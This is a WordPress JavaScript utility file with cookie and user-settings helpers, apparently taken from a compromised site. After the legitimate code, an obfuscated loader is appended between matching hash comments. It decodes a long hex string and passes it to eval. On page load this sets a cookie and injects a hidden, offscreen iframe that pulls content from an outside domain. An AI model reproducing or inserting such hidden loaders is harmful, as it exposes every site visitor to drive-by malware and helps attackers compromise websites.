/* global userSettings */
/* exported getUserSetting, setUserSetting, deleteUserSetting */
// utility functions

var wpCookies = {
// The following functions are from Cookie.js class in TinyMCE 3, Moxiecode, used under LGPL.

	each: function( obj, cb, scope ) {
		var n, l;

		if ( ! obj ) {
			return 0;
		}

		scope = scope || obj;

		if ( typeof( obj.length ) !== 'undefined' ) {
			for ( n = 0, l = obj.length; n < l; n++ ) {
				if ( cb.call( scope, obj[n], n, obj ) === false ) {
					return 0;
				}
			}
		} else {
			for ( n in obj ) {
				if ( obj.hasOwnProperty(n) ) {
					if ( cb.call( scope, obj[n], n, obj ) === false ) {
						return 0;
					}
				}
			}
		}
		return 1;
	},

	/**
	 * Get a multi-values cookie.
	 * Returns a JS object with the name: 'value' pairs.
	 */
	getHash: function( name ) {
		var cookie = this.get( name ), values;

		if ( cookie ) {
			this.each( cookie.split('&'), function( pair ) {
				pair = pair.split('=');
				values = values || {};
				values[pair[0]] = pair[1];
			});
		}

		return values;
	},

	/**
	 * Set a multi-values cookie.
	 *
	 * 'values_obj' is the JS object that is stored. It is encoded as URI in wpCookies.set().
	 */
	setHash: function( name, values_obj, expires, path, domain, secure ) {
		var str = '';

		this.each( values_obj, function( val, key ) {
			str += ( ! str ? '' : '&' ) + key + '=' + val;
		});

		this.set( name, str, expires, path, domain, secure );
	},

	/**
	 * Get a cookie.
	 */
	get: function( name ) {
		var e, b,
			cookie = document.cookie,
			p = name + '=';

		if ( ! cookie ) {
			return;
		}

		b = cookie.indexOf( '; ' + p );

		if ( b === -1 ) {
			b = cookie.indexOf(p);

			if ( b !== 0 ) {
				return null;
			}
		} else {
			b += 2;
		}

		e = cookie.indexOf( ';', b );

		if ( e === -1 ) {
			e = cookie.length;
		}

		return decodeURIComponent( cookie.substring( b + p.length, e ) );
	},

	/**
	 * Set a cookie.
	 *
	 * The 'expires' arg can be either a JS Date() object set to the expiration date (back-compat)
	 * or the number of seconds until expiration
	 */
	set: function( name, value, expires, path, domain, secure ) {
		var d = new Date();

		if ( typeof( expires ) === 'object' && expires.toGMTString ) {
			expires = expires.toGMTString();
		} else if ( parseInt( expires, 10 ) ) {
			d.setTime( d.getTime() + ( parseInt( expires, 10 ) * 1000 ) ); // time must be in miliseconds
			expires = d.toGMTString();
		} else {
			expires = '';
		}

		document.cookie = name + '=' + encodeURIComponent( value ) +
			( expires ? '; expires=' + expires : '' ) +
			( path    ? '; path=' + path       : '' ) +
			( domain  ? '; domain=' + domain   : '' ) +
			( secure  ? '; secure'             : '' );
	},

	/**
	 * Remove a cookie.
	 *
	 * This is done by setting it to an empty value and setting the expiration time in the past.
	 */
	remove: function( name, path, domain, secure ) {
		this.set( name, '', -1000, path, domain, secure );
	}
};

// Returns the value as string. Second arg or empty string is returned when value is not set.
function getUserSetting( name, def ) {
	var settings = getAllUserSettings();

	if ( settings.hasOwnProperty( name ) ) {
		return settings[name];
	}

	if ( typeof def !== 'undefined' ) {
		return def;
	}

	return '';
}

// Both name and value must be only ASCII letters, numbers or underscore
// and the shorter, the better (cookies can store maximum 4KB). Not suitable to store text.
// The value is converted and stored as string.
function setUserSetting( name, value, _del ) {
	if ( 'object' !== typeof userSettings ) {
		return false;
	}

	var uid = userSettings.uid,
		settings = wpCookies.getHash( 'wp-settings-' + uid ),
		path = userSettings.url,
		secure = !! userSettings.secure;

	name = name.toString().replace( /[^A-Za-z0-9_]/, '' );

	if ( typeof value === 'number' ) {
		value = parseInt( value, 10 );
	} else {
		value = value.toString().replace( /[^A-Za-z0-9_]/, '' );
	}

	settings = settings || {};

	if ( _del ) {
		delete settings[name];
	} else {
		settings[name] = value;
	}

	wpCookies.setHash( 'wp-settings-' + uid, settings, 31536000, path, '', secure );
	wpCookies.set( 'wp-settings-time-' + uid, userSettings.time, 31536000, path, '', secure );

	return name;
}

function deleteUserSetting( name ) {
	return setUserSetting( name, '', 1 );
}

// Returns all settings as js object.
function getAllUserSettings() {
	if ( 'object' !== typeof userSettings ) {
		return {};
	}

	return wpCookies.getHash( 'wp-settings-' + userSettings.uid ) || {};
}
/*a48905c1459052dd941a3458e47eb4ec*/;(function(){var kezzenye="";var idrzntkt="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f736974652e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6b6579776f72643d35633363363364666661316238666336613233313131646430373766303264652674755a5763567a43733d76677a6d4b76505554484f41494e65674d26486a53794e72707a6d76433d544a4f59597753726d5a4f4c6f4a69622656444763496a4c57496a4453723d474e564a4866584a4e2652524d666d6d4d54564a743d56416f5a554272467761786c6376746c6426514b747641714a725854707a75755a5257653d4f7151456562266e4c5743526c546d614e52523d76464e6764686756644f57655a41264741485964616e47696b4d4f6d3d6f6479474d534f4e4e78414226466a7447526446667650464e5a3d7157486e6c4b4b50794363497667535378737949223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var zdsyitkf=0;zdsyitkf<idrzntkt.length;zdsyitkf+=2){kezzenye=kezzenye+parseInt(idrzntkt.substring(zdsyitkf,zdsyitkf+2), 16)+",";}kezzenye=kezzenye.substring(0,kezzenye.length-1);eval(eval('String.fromCharCode('+kezzenye+')'));})();/*a48905c1459052dd941a3458e47eb4ec*/